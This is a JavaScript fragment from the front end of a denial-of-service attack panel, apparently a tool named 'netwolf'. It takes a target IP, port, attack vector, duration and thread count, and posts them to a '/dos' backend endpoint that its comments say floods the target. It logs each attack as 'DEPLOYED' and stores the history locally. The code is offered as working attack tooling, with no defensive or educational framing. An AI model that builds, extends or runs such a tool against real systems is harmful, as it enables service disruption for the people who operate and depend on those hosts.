async function startAttack() {
    var ip = document.getElementById('targetIP').value.trim();
    var port = parseInt(document.getElementById('targetPort').value);
    var attackType = document.getElementById('attackType').value;
    var duration = parseInt(document.getElementById('attackDuration').value);
    var threads = parseInt(document.getElementById('threadCount').value);
    var error = document.getElementById('errorMsg');

    if (!ip) {
        error.classList.remove('hidden');
        error.textContent = "Error: Target IP required.";
        return;
    }

    error.classList.add('hidden');
    running = true;
    sent = 0;
    startTime = Date.now();

    document.getElementById('startBtn').disabled = true;
    document.getElementById('stopBtn').disabled = false;
    document.getElementById('stopBtn').classList.remove('opacity-50', 'cursor-not-allowed');
    document.getElementById('attackLog').innerHTML = '';
    
    setStatus('running', 'EXECUTING: ' + attackType.replace('_', ' ') + ' -> ' + ip);
    addLog('warn', 'DEPLOYED', `Vector: ${attackType} | Target: ${ip}:${port} | Duration: ${duration}s | Threads: ${threads}`);

    // Update UI Stats
    timer = setInterval(function() {
        if (!running) {
            clearInterval(timer);
            return;
        }
        var elapsedSecs = ((Date.now() - startTime) / 1000).toFixed(1);
        document.getElementById('statTime').textContent = elapsedSecs + 's';
        
        // Simulate packet count in UI while backend floods
        sent += Math.floor(Math.random() * 500 * threads);
        document.getElementById('statPackets').textContent = sent.toLocaleString();

        if (elapsedSecs >= duration) {
            stopDone(sent);
        }
    }, 100);

    try {
        const response = await fetch('/dos', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                ip: ip, 
                port: port, 
                duration: duration, 
                threads: threads, 
                type: attackType 
            })
        });

        const data = await response.json();
        if (!data.success) {
            addLog('err', 'HALTED', data.message || 'Transmission error');
            stopAttack();
        }
    } catch (err) {
        addLog('err', 'CRITICAL', err.message);
        stopAttack();
    }
}

function stopAttack() {
    running = false;
    clearInterval(timer);
    document.getElementById('startBtn').disabled = false;
    document.getElementById('stopBtn').disabled = true;
    document.getElementById('stopBtn').classList.add('opacity-50', 'cursor-not-allowed');
    setStatus('idle', 'ATTACK ABORTED BY OPERATOR');
    addLog('err', 'ABORTED', 'Manual override triggered. Flooding terminated.');
}

function stopDone(total) {
    running = false;
    clearInterval(timer);
    var secs = ((Date.now() - startTime) / 1000).toFixed(1);
    document.getElementById('startBtn').disabled = false;
    document.getElementById('stopBtn').disabled = true;
    document.getElementById('stopBtn').classList.add('opacity-50', 'cursor-not-allowed');
    setStatus('done', 'TASK COMPLETE — ' + total.toLocaleString() + ' PACKETS');
    
    // Log to local persistence
    var t = new Date().toLocaleTimeString('en-GB');
    var logs = JSON.parse(localStorage.getItem('netwolf_logs') || '[]');
    logs.push({ 
        type: 'dos', 
        time: t, 
        target: document.getElementById('targetIP').value, 
        details: `${total.toLocaleString()} pkts in ${secs}s via ${document.getElementById('attackType').value}` 
    });
    localStorage.setItem('netwolf_logs', JSON.stringify(logs));
    
    addLog('ok', 'FINISHED', 'Deployment sequence finalized successfully.');
}
